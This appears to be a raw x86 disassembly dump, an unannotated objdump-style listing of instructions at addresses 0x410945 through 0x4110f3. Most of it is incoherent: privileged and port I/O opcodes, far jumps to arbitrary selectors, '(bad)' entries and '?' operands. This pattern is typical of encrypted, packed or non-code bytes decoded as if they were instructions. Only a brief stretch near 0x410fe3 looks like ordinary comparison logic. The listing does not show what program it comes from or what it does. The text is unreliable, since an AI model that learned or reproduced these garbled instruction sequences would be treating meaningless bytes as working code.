  410945:	inc    edi
  410946:	cdq    
  410947:	mov    ebx,0xd7f1ac57
  41094c:	cmp    al,0x4e
  41094e:	ficom  WORD PTR [edx]
  410950:	ins    DWORD PTR es:[edi],dx
  410951:	push   edx
  410952:	in     al,0x68
  410954:	pop    edi
  410955:	xchg   ecx,eax
  410956:	inc    ebx
  410957:	or     DWORD PTR [edi],0xffffff91
  41095a:	sti    
  41095b:	stos   BYTE PTR es:[edi],al
  41095c:	mov    dh,0x8c
  41095e:	cld    
  41095f:	inc    esi
  410960:	or     al,0x17
  410962:	pop    ebx
  410963:	sub    al,0xf2
  410965:	js     0x410995
  410967:	dec    eax
  410968:	scas   al,BYTE PTR es:[edi]
  410969:	xchg   esi,ecx
  41096b:	adc    DWORD PTR [ebx+0x560de61d],ecx
  410971:	and    eax,DWORD PTR [eax+edi*2+0xa65e05e]
  410978:	fimul  WORD PTR [edi]
  41097a:	int3   
  41097b:	pop    ebp
  41097c:	aad    0xda
  41097e:	add    al,0xe9
  410980:	adc    eax,0xcbe8a0b6
  410985:	stc    
  410986:	cdq    
  410987:	inc    ebx
  410988:	mov    ecx,0x49c36587
  41098d:	xor    eax,DWORD PTR [edi+0xb8f8819]
  410993:	push   edx
  410994:	aas    
  410995:	sbb    ebp,edx
  410997:	xchg   ecx,eax
  410998:	cmp    eax,0x8fb71915
  41099d:	setno  BYTE PTR ds:0x9ebdbbf9
  4109a4:	fs push 0xffffff9a
  4109a7:	fcomi  st,st(3)
  4109a9:	ffree  st(0)
  4109ab:	nop
  4109ac:	daa    
  4109ad:	mov    dl,0xd6
  4109af:	sbb    eax,0xb533f75e
  4109b4:	(bad)  
  4109b5:	pop    esi
  4109b6:	enter  0x586d,0xe3
  4109ba:	adc    BYTE PTR [ebx-0x21f9a42f],bl
  4109c0:	fdivr  QWORD PTR [esi-0x190a78fe]
  4109c6:	cmc    
  4109c7:	xchg   esp,eax
  4109c8:	jne    0x410a44
  4109ca:	adc    edx,eax
  4109cc:	inc    ecx
  4109cd:	loop   0x410a34
  4109cf:	inc    esp
  4109d0:	mov    ebx,0xdb6954f
  4109d5:	into   
  4109d6:	adc    ecx,ecx
  4109d8:	stc    
  4109d9:	add    dl,0xd
  4109dc:	loop   0x410a0a
  4109de:	hlt    
  4109df:	fwait
  4109e0:	les    esi,FWORD PTR [ecx]
  4109e2:	push   edi
  4109e3:	xor    eax,DWORD PTR ds:0x655a94c1
  4109e9:	nop
  4109ea:	pushf  
  4109eb:	and    bh,BYTE PTR [esi+0x26e3a61]
  4109f1:	or     esp,DWORD PTR [ebx-0x2f]
  4109f4:	jnp    0x4109b7
  4109f6:	shl    bh,0x4b
  4109f9:	cmp    eax,0xadec4dba
  4109fe:	addr16 push eax
  410a00:	aas    
  410a01:	jns    0x410989
  410a03:	xchg   ebx,eax
  410a04:	mov    fs,WORD PTR [esi]
  410a06:	and    eax,0x9eac55b
  410a0b:	fs sub ebx,0x78aa37bf
  410a12:	stos   BYTE PTR es:[edi],al
  410a13:	leave  
  410a14:	mov    es,WORD PTR [esi-0x20e5a594]
  410a1a:	fild   QWORD PTR [ebx-0x75]
  410a1d:	mov    ecx,0x3744ffb9
  410a22:	lea    eax,[ebx-0xc]
  410a25:	test   DWORD PTR [bx+di],0x5a5ad6d5
  410a2c:	mov    ebp,0x19280c9f
  410a31:	ret    
  410a32:	rcl    DWORD PTR [ebx],1
  410a34:	scas   eax,DWORD PTR es:[edi]
  410a35:	push   0xfffffff6
  410a37:	or     al,0xba
  410a39:	lds    ebp,FWORD PTR [edx-0x1639fc1c]
  410a3f:	leave  
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	(bad)  
  410a51:	xchg   ecx,eax
  410a52:	push   0xffffffba
  410a54:	mov    ebp,0x7caf7e7e
  410a59:	jle    0x410ad9
  410a5b:	or     eax,0x65b1ead7
  410a60:	xchg   esp,eax
  410a61:	out    0x4f,al
  410a63:	nop
  410a64:	pop    edi
  410a65:	mov    edi,0xbdbcb721
  410a6a:	lea    esp,[ebp+0x5d]
  410a6d:	pop    esi
  410a6e:	mov    edi,DWORD PTR [ebp-0x692e9d93]
  410a74:	xlat   BYTE PTR ds:[ebx]
  410a75:	pop    ss
  410a76:	push   edx
  410a77:	sbb    eax,0x5dd9325c
  410a7c:	inc    edx
  410a7d:	ja     0x410a47
  410a7f:	mov    al,ds:0x69128fa0
  410a84:	pop    edi
  410a85:	mov    cl,dl
  410a87:	xor    al,0x84
  410a89:	add    eax,0x8f543945
  410a8e:	lds    esp,FWORD PTR [ebx]
  410a90:	adc    al,0xbb
  410a92:	(bad)  
  410a93:	adc    BYTE PTR [edx],ch
  410a95:	xchg   esi,eax
  410a96:	addr16 es jg 0x410ae1
  410a9a:	fstp   TBYTE PTR [edi+0x40]
  410a9d:	dec    edi
  410a9e:	shr    DWORD PTR [esi-0xd],0x96
  410aa2:	ficomp WORD PTR [ebx*1-0xb4ffa53]
  410aa9:	mov    ch,0xf4
  410aab:	js     0x410a59
  410aad:	mov    ds:0x2d099ab2,eax
  410ab2:	jnp    0x410b02
  410ab4:	inc    ebp
  410ab5:	or     ecx,DWORD PTR [ebx-0x19]
  410ab8:	(bad)
  410abb:	(bad)  
  410abc:	in     al,0x7f
  410abe:	cmp    eax,0xce8725cb
  410ac3:	push   ecx
  410ac4:	rcr    ebp,cl
  410ac6:	mov    ebp,0xcc903377
  410acb:	fnstsw WORD PTR [edx-0x3]
  410ace:	pop    esi
  410acf:	sbb    BYTE PTR [eax+0x1c2b1849],0xe1
  410ad6:	(bad)  
  410ad8:	jno    0x410a63
  410ada:	fldcw  WORD PTR [ebp+0x54]
  410add:	dec    edi
  410ade:	jg     0x410ad1
  410ae0:	pop    esp
  410ae1:	push   edx
  410ae2:	shl    BYTE PTR [ecx+0xb],1
  410ae5:	(bad)  
  410ae6:	xchg   esi,eax
  410ae7:	hlt    
  410ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ae9:	or     dl,ch
  410aeb:	sbb    ebx,DWORD PTR [ebp*2+0x7ee3cf4d]
  410af2:	cld    
  410af3:	pusha  
  410af4:	sub    DWORD PTR [ebx-0x25ab03b7],ecx
  410afa:	stos   BYTE PTR es:[edi],al
  410afb:	xchg   ecx,eax
  410afc:	bound  esp,QWORD PTR [esi+0x17]
  410aff:	imul   ebx,ebp,0xc33bff40
  410b05:	adc    eax,ebp
  410b07:	repnz and esp,esp
  410b0a:	loop   0x410b67
  410b0c:	iret   
  410b0d:	cmp    bl,cl
  410b0f:	cmp    DWORD PTR [ecx],ecx
  410b11:	pop    eax
  410b12:	dec    eax
  410b13:	mov    edi,0x9b771bd4
  410b18:	jnp    0x410abf
  410b1a:	push   cs
  410b1b:	mov    bl,0xa4
  410b1d:	in     eax,0x6
  410b1f:	sbb    ebp,ebp
  410b21:	fnsave [esi+0x5791d7d6]
  410b27:	sub    eax,DWORD PTR [ebx+0x3c220a29]
  410b2d:	iret   
  410b2e:	int    0xcd
  410b30:	mov    bh,0xb9
  410b32:	mov    BYTE PTR [ecx+eiz*4-0xfbdfd64],dh
  410b39:	aas    
  410b3a:	les    edi,FWORD PTR [edi-0x597297be]
  410b40:	ss mov al,0xc8
  410b43:	dec    esp
  410b44:	xchg   edi,eax
  410b45:	mov    ds:0x32a1b5d4,al
  410b4a:	mov    al,bl
  410b4c:	retf   0xb271
  410b4f:	pop    edi
  410b50:	cld    
  410b51:	addr16 das 
  410b53:	push   ecx
  410b54:	or     dh,ah
  410b56:	mov    bh,0xc8
  410b58:	cmp    dl,BYTE PTR [ecx+0x7f771d7c]
  410b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b5f:	or     DWORD PTR [edi-0x25735ab9],ebx
  410b65:	add    dh,BYTE PTR [eax+0x5d09aca7]
  410b6b:	outs   dx,BYTE PTR ds:[esi]
  410b6c:	xchg   esi,eax
  410b6d:	cmp    eax,esp
  410b6f:	mov    ebp,0xe382bc74
  410b74:	and    ebp,DWORD PTR [ecx]
  410b76:	addr16 pop edi
  410b78:	pop    eax
  410b79:	in     eax,dx
  410b7a:	mov    DWORD PTR [ebp-0x78],esi
  410b7d:	mov    ss,WORD PTR [ebp+0x7e9f20b8]
  410b83:	jo     0x410bd7
  410b85:	fsub   DWORD PTR [ecx]
  410b87:	push   ds
  410b88:	push   cs
  410b89:	pusha  
  410b8a:	out    dx,al
  410b8b:	mov    ebp,0x61dfdfb
  410b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b91:	sbb    al,0xa0
  410b93:	and    eax,0xc10fd658
  410b98:	push   eax
  410b99:	inc    edi
  410b9a:	mov    BYTE PTR [eax+0x0],0x73
  410b9e:	out    0xa8,eax
  410ba0:	mov    ds:0xc4f443df,al
  410ba5:	sub    al,0x3a
  410ba7:	push   ss
  410ba8:	lods   al,BYTE PTR ds:[esi]
  410ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410baa:	adc    bl,BYTE PTR [ebx]
  410bac:	mov    ah,0x6e
  410bae:	dec    ebp
  410baf:	push   edx
  410bb0:	shl    BYTE PTR [edx],cl
  410bb2:	lods   eax,DWORD PTR ds:[esi]
  410bb3:	cdq    
  410bb4:	push   eax
  410bb5:	sub    DWORD PTR [edi],ebx
  410bb7:	inc    ecx
  410bb8:	jmp    0xb6d4:0x759a11ee
  410bbf:	mov    dl,BYTE PTR [ebp+0x3ab80c49]
  410bc5:	ret    
  410bc6:	mov    al,0x76
  410bc8:	fcmovbe st,st(4)
  410bca:	inc    ebp
  410bcb:	cmp    eax,0x833ece0e
  410bd0:	pop    esp
  410bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd2:	xchg   BYTE PTR [ecx],ch
  410bd4:	aaa    
  410bd5:	pop    esi
  410bd6:	mov    dl,0x6a
  410bd8:	fwait
  410bd9:	jmp    0x7484:0xe5b02438
  410be0:	int3   
  410be1:	scas   eax,DWORD PTR es:[edi]
  410be2:	lea    eax,[bx+di+0x6e]
  410be6:	repnz or esp,DWORD PTR [ebx+0x46]
  410bea:	int3   
  410beb:	mov    ch,0x83
  410bed:	mov    esp,0xac688ae4
  410bf2:	jg     0x410bca
  410bf4:	jl     0x410ba8
  410bf6:	outs   dx,BYTE PTR ds:[esi]
  410bf7:	jge    0x410b81
  410bf9:	pop    edi
  410bfa:	and    al,0xfd
  410bfc:	and    bl,BYTE PTR [ebx+0x1026d4b6]
  410c02:	sbb    eax,DWORD PTR ds:0x8ec32882
  410c08:	dec    edx
  410c09:	push   0xffffffa7
  410c0b:	pop    edi
  410c0c:	int3   
  410c0d:	and    al,BYTE PTR [eax+edi*1+0x75]
  410c11:	mov    esp,0x5a78e1e2
  410c16:	mov    bh,0x9a
  410c18:	idiv   bh
  410c1a:	dec    edx
  410c1b:	mov    cl,0x40
  410c1d:	mov    bl,0x3e
  410c1f:	mov    ebx,0x2981d4f8
  410c24:	dec    ebp
  410c25:	mov    WORD PTR [edx+0x10],?
  410c28:	sub    ebp,DWORD PTR [esi-0x4f6be04b]
  410c2e:	sbb    DWORD PTR [edx],edi
  410c30:	aad    0x9f
  410c32:	ror    DWORD PTR [edx],cl
  410c34:	outs   dx,BYTE PTR ds:[esi]
  410c35:	lock mov ds,ecx
  410c38:	bswap  ebx
  410c3a:	stc    
  410c3b:	ret    0x68e
  410c3e:	hlt    
  410c3f:	inc    edi
  410c40:	out    dx,al
  410c41:	outs   dx,BYTE PTR ds:[esi]
  410c42:	(bad)
  410c45:	cmp    al,cl
  410c47:	leave  
  410c48:	out    0xcf,al
  410c4a:	cmp    bh,BYTE PTR [edx-0x75]
  410c4d:	push   ecx
  410c4e:	fnsave [edi]
  410c50:	fucom  st(7)
  410c52:	rcr    DWORD PTR [ecx],cl
  410c54:	dec    eax
  410c55:	mov    bh,0x6f
  410c57:	adc    eax,DWORD PTR [ebx-0x3e]
  410c5a:	or     cl,dl
  410c5c:	clc    
  410c5d:	and    al,0xbf
  410c5f:	cmp    al,0xba
  410c61:	mov    eax,0x3a660a88
  410c66:	cmc    
  410c67:	xchg   esi,eax
  410c68:	repnz arpl WORD PTR [eax-0x4c593775],bp
  410c6f:	test   al,0xf9
  410c71:	add    esp,DWORD PTR [ecx+0x2d3cb044]
  410c77:	repz data16 std 
  410c7a:	mov    ds:0x28004b15,al
  410c7f:	sahf   
  410c80:	lds    esp,FWORD PTR [esi]
  410c82:	hlt    
  410c83:	cs inc ebp
  410c85:	(bad)  
  410c86:	out    dx,eax
  410c87:	cdq    
  410c88:	shl    dl,1
  410c8a:	push   ebp
  410c8b:	mov    bl,0xd1
  410c8d:	in     eax,0x4e
  410c8f:	shr    DWORD PTR [ebp+0x2b],1
  410c92:	jp     0x410c40
  410c94:	fcomp  st(4)
  410c96:	test   BYTE PTR [edx],cl
  410c98:	jmp    0x410ced
  410c9a:	ror    BYTE PTR [edx],cl
  410c9c:	dec    edx
  410c9d:	mov    dl,0x24
  410c9f:	inc    ebp
  410ca0:	mov    esi,ebx
  410ca2:	mov    ?,edx
  410ca4:	sub    edi,edx
  410ca6:	mov    cl,cl
  410ca8:	inc    edi
  410ca9:	xor    al,0xfa
  410cab:	aam    0xf2
  410cad:	call   0xe53:0x838064a2
  410cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cb5:	repnz dec esp
  410cb7:	push   esi
  410cb8:	dec    eax
  410cb9:	jbe    0x410ca8
  410cbb:	inc    esp
  410cbc:	inc    ecx
  410cbd:	mov    dh,BYTE PTR [esp+ecx*8-0x29]
  410cc1:	test   BYTE PTR [esi],0x95
  410cc4:	xor    DWORD PTR [edx-0x45a957c0],esp
  410cca:	dec    DWORD PTR [esi]
  410ccc:	mov    eax,ds:0xf5901c26
  410cd1:	mov    dh,0x7b
  410cd3:	ret    0xee35
  410cd6:	scas   eax,DWORD PTR es:[edi]
  410cd7:	adc    DWORD PTR [edi-0x60],eax
  410cda:	jo     0x410d04
  410cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cdd:	rcl    DWORD PTR [edi-0x397c4fc2],1
  410ce3:	push   0x30
  410ce5:	adc    dh,bh
  410ce7:	sbb    eax,0x5af7aa57
  410cec:	jns    0x410d62
  410cee:	fsubr  DWORD PTR [ebx+0x3c]
  410cf1:	jmp    0x449a:0xd3f1d2f4
  410cf8:	push   ebx
  410cf9:	call   0xf782:0x2391a6be
  410d00:	scas   al,BYTE PTR es:[edi]
  410d01:	pop    esi
  410d02:	push   eax
  410d03:	ja     0x410d52
  410d05:	dec    ebx
  410d06:	call   0x89ea:0xd50d273d
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x9f235f9c
  410d25:	cs jmp 0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d5b
  410d2f:	scas   eax,DWORD PTR es:[edi]
  410d30:	gs loopne 0x410d87
  410d33:	or     ah,BYTE PTR [esp+ebp*8]
  410d36:	cs jae 0x410d83
  410d39:	pop    ds
  410d3a:	inc    edx
  410d3b:	and    cl,cl
  410d3d:	xor    BYTE PTR [eax],dh
  410d3f:	mov    ebx,?
  410d41:	jge    0x410d74
  410d43:	js     0x410d6c
  410d45:	mov    eax,ds:0xfe7ec16d
  410d4a:	mov    ds:0xe1560369,al
  410d4f:	sub    DWORD PTR [edi-0x7f],0x88dd7973
  410d56:	adc    eax,0x72ba3c0c
  410d5b:	dec    esp
  410d5c:	aaa    
  410d5d:	lods   eax,DWORD PTR ds:[esi]
  410d5e:	and    DWORD PTR [ecx-0x67],0x33
  410d62:	icebp  
  410d63:	sti    
  410d64:	mov    dh,0xcb
  410d66:	in     eax,dx
  410d67:	call   0xf9471474
  410d6c:	pop    esi
  410d6d:	ror    DWORD PTR [ebp+0x3c04af61],0xc4
  410d74:	sub    BYTE PTR [esp+ebp*2],ah
  410d77:	gs xor eax,0x166049ec
  410d7d:	and    ah,bh
  410d7f:	hlt    
  410d80:	cmp    dl,BYTE PTR [edi+0x40a258eb]
  410d86:	xor    al,0x5f
  410d88:	xor    BYTE PTR [eax+0x4],dh
  410d8b:	xor    DWORD PTR [ebx-0x53f7fdde],ecx
  410d91:	push   DWORD PTR ds:0x50850ff3
  410d97:	loopne 0x410d67
  410d99:	sar    bh,0x80
  410d9c:	mov    eax,0x50a576c1
  410da1:	mov    esi,0x4ac5e9e2
  410da6:	push   ebp
  410da7:	mov    bh,0x8d
  410da9:	jb     0x410db8
  410dab:	aam    0xf1
  410dad:	fstp   DWORD PTR [ebp+0x70]
  410db0:	mov    BYTE PTR [eax],bl
  410db2:	das    
  410db3:	fdiv   st,st(5)
  410db5:	les    ecx,FWORD PTR [edi]
  410db7:	int3   
  410db8:	or     ebx,DWORD PTR [eax-0x20]
  410dbb:	hlt    
  410dbc:	ror    DWORD PTR [ebp-0x3af93454],cl
  410dc2:	push   DWORD PTR [ecx-0x4e]
  410dc5:	mov    BYTE PTR [ebx-0x3c],dh
  410dc8:	inc    ebp
  410dc9:	cdq    
  410dca:	call   0xf951:0x316d3125
  410dd1:	jne    0x410d54
  410dd3:	inc    ecx
  410dd4:	call   0xfec43302
  410dd9:	dec    edx
  410dda:	jmp    0x9ce5a8e8
  410ddf:	pop    ds
  410de0:	outs   dx,BYTE PTR ds:[esi]
  410de1:	imul   ecx,DWORD PTR [ebp+0x7caaeb64],0x5
  410de8:	jp     0x410d9c
  410dea:	int3   
  410deb:	xchg   ebx,eax
  410dec:	(bad)  
  410ded:	fwait
  410dee:	aas    
  410def:	dec    esi
  410df0:	int3   
  410df1:	xchg   esp,edi
  410df3:	pop    ebx
  410df4:	clc    
  410df5:	mov    ah,BYTE PTR [esi]
  410df7:	dec    ebx
  410df8:	das    
  410df9:	jne    0x410e32
  410dfb:	push   ds
  410dfc:	aam    0x73
  410dfe:	jbe    0x410dc3
  410e00:	das    
  410e01:	add    dh,BYTE PTR [edi+0x52]
  410e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e05:	xchg   DWORD PTR [esi],esi
  410e07:	and    dh,bl
  410e09:	adc    DWORD PTR ds:0x6de14267,edx
  410e0f:	repz cmp BYTE PTR [ebp+0x37],dl
  410e13:	xchg   esi,eax
  410e14:	push   ebx
  410e15:	ret    
  410e16:	sahf   
  410e17:	stos   DWORD PTR es:[edi],eax
  410e18:	fdivr  st,st(0)
  410e1a:	cmp    bh,BYTE PTR [eax+0x7c16b7ae]
  410e20:	jecxz  0x410e86
  410e22:	xlat   BYTE PTR ds:[ebx]
  410e23:	call   0x80e6c81a
  410e28:	pop    ebp
  410e29:	pop    ss
  410e2a:	xlat   BYTE PTR ds:[ebx]
  410e2b:	hlt    
  410e2c:	dec    eax
  410e2d:	fcmovne st,st(3)
  410e2f:	popf   
  410e30:	mov    ebx,0x51a93b6a
  410e35:	xor    dh,dh
  410e37:	inc    edi
  410e38:	xchg   ebx,eax
  410e3a:	out    dx,eax
  410e3b:	mov    esi,0xf78d6ff9
  410e40:	mov    dl,0xef
  410e42:	hlt    
  410e43:	(bad)  
  410e44:	test   bh,0xda
  410e47:	int    0xc3
  410e49:	shl    DWORD PTR cs:[edi-0x29],cl
  410e4d:	adc    ecx,DWORD PTR [ecx]
  410e4f:	(bad)  
  410e50:	pop    edi
  410e51:	pop    ebx
  410e52:	cmp    BYTE PTR [esi-0x58],0x9b
  410e56:	test   esi,ecx
  410e58:	pop    esi
  410e59:	pop    esi
  410e5a:	xor    al,0x65
  410e5c:	dec    esi
  410e5d:	jmp    ebx
  410e5f:	xor    eax,0x79bf006d
  410e64:	inc    ecx
  410e65:	adc    cl,ah
  410e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e68:	and    cl,BYTE PTR [edx+0x33e1b7eb]
  410e6e:	repz cmp edi,ebp
  410e71:	mov    ebx,DWORD PTR ds:0x11065b0e
  410e77:	push   ebp
  410e78:	cmp    ecx,DWORD PTR es:[edi+0x2d]
  410e7c:	sbb    bl,BYTE PTR [esi]
  410e7e:	cmp    BYTE PTR [eax-0x71],ah
  410e81:	or     edx,DWORD PTR ds:0xaf1fc374
  410e87:	xchg   al,bl
  410e89:	repnz mov esp,0x878b059e
  410e8f:	les    eax,FWORD PTR [edi]
  410e91:	mov    ah,0x90
  410e93:	int    0x9e
  410e95:	std    
  410e96:	inc    edi
  410e97:	cwde   
  410e98:	pusha  
  410e99:	clc    
  410e9a:	and    al,0xde
  410e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e9d:	lods   al,BYTE PTR ds:[esi]
  410e9e:	mov    ebx,0xf8307aef
  410ea3:	mov    al,0x6a
  410ea5:	retf   0x33f2
  410ea8:	(bad)  
  410ea9:	push   0x16ee66b5
  410eae:	dec    esp
  410eaf:	and    esi,esi
  410eb1:	imul   ebx,DWORD PTR ds:0x378f6268,0xa3b05d6e
  410ebb:	or     DWORD PTR [edi+0x25],edx
  410ebe:	popa   
  410ebf:	sbb    cl,BYTE PTR [eax]
  410ec1:	retf   
  410ec2:	outs   dx,BYTE PTR ds:[esi]
  410ec3:	jge    0x410ec7
  410ec5:	inc    ebp
  410ec6:	push   ebx
  410ec7:	or     edx,edi
  410ec9:	and    eax,0x1b16e78d
  410ece:	scas   eax,DWORD PTR es:[edi]
  410ecf:	xor    al,0x2b
  410ed1:	inc    esi
  410ed2:	xchg   ecx,eax
  410ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ed4:	cli    
  410ed5:	mov    al,ds:0x6ea14b5a
  410eda:	jns    0x410f4e
  410edc:	jecxz  0x410ea7
  410ede:	dec    edx
  410edf:	inc    eax
  410ee0:	pop    esi
  410ee1:	ds dec edi
  410ee3:	push   ds
  410ee4:	(bad)  
  410ee5:	jb     0x410e8a
  410ee7:	int3   
  410ee8:	(bad)  
  410ee9:	sti    
  410eea:	fcomp  st(0)
  410eec:	add    ebp,DWORD PTR [ebp-0x2eb99970]
  410ef2:	repnz adc ebp,DWORD PTR [eax]
  410ef5:	jp     0x410f28
  410ef7:	popa   
  410ef8:	std    
  410ef9:	lock gs jae 0x410ecc
  410efd:	ss ins BYTE PTR es:[edi],dx
  410eff:	outs   dx,BYTE PTR ds:[esi]
  410f00:	lock dec esp
  410f02:	clc    
  410f03:	sbb    eax,0xf1bed7cd
  410f08:	mov    esp,0x7903e149
  410f0d:	push   ecx
  410f0e:	ret    0x633a
  410f11:	adc    ebx,edx
  410f13:	and    eax,DWORD PTR [ecx]
  410f15:	out    0xb5,al
  410f17:	mov    ch,BYTE PTR [edi+0x1209ef25]
  410f1d:	mov    ecx,0x5f960d1a
  410f22:	xor    al,0x11
  410f24:	sbb    bl,BYTE PTR [ecx+0x23]
  410f27:	lahf   
  410f28:	sub    esi,ebp
  410f2a:	jge    0x410f29
  410f2c:	add    edi,DWORD PTR [edi+0x2a]
  410f2f:	cli    
  410f30:	cmp    BYTE PTR [edx+0x7f944527],0x6b
  410f37:	adc    eax,0x4b7151ef
  410f3c:	pop    ecx
  410f3d:	push   ebp
  410f3e:	pusha  
  410f3f:	test   DWORD PTR [ecx+0x59629a61],0xfda2fb60
  410f49:	dec    esi
  410f4a:	loope  0x410fb6
  410f4c:	and    cl,bh
  410f4e:	jns    0x410f0d
  410f50:	jo     0x410f2c
  410f52:	inc    ebx
  410f53:	add    ebp,ebx
  410f55:	inc    esi
  410f56:	je     0x410fc9
  410f58:	repz js 0x410f00
  410f5b:	gs mov ch,0x58
  410f5e:	push   ds
  410f5f:	in     al,dx
  410f60:	or     BYTE PTR [esi+0x69],bl
  410f63:	cmp    DWORD PTR ds:0x2efc3ae,0x27
  410f6a:	mov    ah,0x4a
  410f6c:	addr16 int 0xa7
  410f6f:	imul   cl
  410f71:	pop    ss
  410f72:	sub    esp,edx
  410f74:	push   ebp
  410f75:	dec    ebx
  410f76:	aam    0xbd
  410f78:	sub    bl,dh
  410f7a:	arpl   WORD PTR [edi+esi*1-0x56fb993e],cx
  410f81:	fmul   QWORD PTR ds:0xdfd3d787
  410f87:	mov    eax,0xaba0e0fd
  410f8c:	ret    0xeca2
  410f8f:	aad    0x16
  410f91:	push   es
  410f92:	xchg   ecx,eax
  410f93:	pop    edx
  410f94:	fdivr  DWORD PTR [esi+0x38f826d]
  410f9a:	popf   
  410f9b:	mov    cl,0x2c
  410f9d:	clc    
  410f9e:	repz iret 
  410fa0:	in     al,0x5a
  410fa2:	sub    DWORD PTR [ecx+0x23bc6dd9],esi
  410fa8:	pop    es
  410fa9:	out    dx,al
  410faa:	mov    esi,0xa673dacb
  410faf:	push   esp
  410fb0:	push   ebp
  410fb1:	aam    0x46
  410fb3:	mov    ebp,0x59c006a5
  410fb8:	fidiv  DWORD PTR [ecx]
  410fba:	je     0x410fb5
  410fbc:	jae    0x41103b
  410fbe:	shl    al,0x68
  410fc1:	jg     0x411025
  410fc3:	lock lods eax,DWORD PTR ds:[esi]
  410fc5:	sbb    edi,esp
  410fc7:	adc    ebp,DWORD PTR [esi]
  410fc9:	add    al,0x36
  410fcb:	cmp    ebp,DWORD PTR [ebx-0x1b]
  410fce:	add    BYTE PTR [edi-0x5f],bl
  410fd1:	aad    0xfc
  410fd3:	je     0x410fc5
  410fd5:	mov    BYTE PTR [edi+ecx*1-0x6c5ba949],bl
  410fdc:	mov    esi,0xc133fba4
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fe3
  41102b:	mov    ebp,0x47185cf5
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x410ff1
  411037:	clc    
  411038:	lds    ecx,FWORD PTR [ecx-0xc8c36dc]
  41103e:	mov    esp,DWORD PTR [eax+edx*1+0x3a803020]
  411045:	les    ebp,FWORD PTR [ebp+ecx*1+0x552fd829]
  41104c:	cmp    al,0x21
  41104e:	inc    eax
  41104f:	sub    DWORD PTR [edx-0x5967ab74],edx
  411055:	xlat   BYTE PTR ds:[ebx]
  411056:	bnd jbe 0x410fea
  411059:	and    DWORD PTR [edx-0x30981794],ebp
  41105f:	and    edi,DWORD PTR [edi-0x59]
  411062:	mov    ds:0xe7def7ad,al
  411067:	sbb    BYTE PTR [ecx-0x70],ah
  41106a:	in     al,dx
  41106b:	or     al,0x9f
  41106d:	data16 loopne 0x411011
  411070:	mov    ebp,0xa856f014
  411075:	mov    ah,0xb3
  411077:	sti    
  411078:	sar    DWORD PTR [esi-0x10],0x47
  41107c:	or     bl,bh
  41107e:	xchg   esi,eax
  41107f:	xor    DWORD PTR [edx],edx
  411081:	or     al,0x74
  411083:	retf   
  411084:	sahf   
  411085:	(bad)  
  411086:	in     eax,0x73
  411088:	pop    esi
  411089:	and    al,BYTE PTR [edx-0x7c711f98]
  41108f:	pop    edx
  411090:	sub    BYTE PTR [ebp+0x43d73945],cl
  411096:	outs   dx,DWORD PTR ds:[esi]
  411097:	xchg   ebp,eax
  411098:	ret    0xc06a
  41109b:	cmp    dl,dh
  41109d:	mov    BYTE PTR [ebx+0x119405b2],ch
  4110a3:	and    ebx,edi
  4110a5:	xor    DWORD PTR [edi+0x55365d28],eax
  4110ab:	mov    ebp,0xe5e5d255
  4110b0:	lahf   
  4110b1:	add    eax,0xd30216f9
  4110b6:	or     ecx,DWORD PTR [eax+0x670ee0c8]
  4110bc:	xor    al,0x84
  4110be:	sar    ebx,cl
  4110c0:	adc    eax,0x4e7397cc
  4110c5:	pop    es
  4110c6:	sub    DWORD PTR [edx+0x35],0x12
  4110ca:	adc    al,0x56
  4110cc:	jne    0x4110e9
  4110ce:	fdivr  QWORD PTR [edx-0x6c]
  4110d1:	add    DWORD PTR [edi+0x17844613],esi
  4110d7:	fadd   st,st(6)
  4110d9:	imul   edx,DWORD PTR [eax+0x5d82fa76],0x1e44c9e9
  4110e3:	xchg   esp,eax
  4110e4:	add    dl,dh
  4110e6:	outs   dx,DWORD PTR ds:[esi]
  4110e7:	outs   dx,DWORD PTR ds:[esi]
  4110e8:	or     DWORD PTR [ecx+0x2a],edi
  4110eb:	cli    
  4110ec:	test   BYTE PTR [edx],bh
  4110ee:	push   0x184139b9
  4110f3:	aam    0xd8
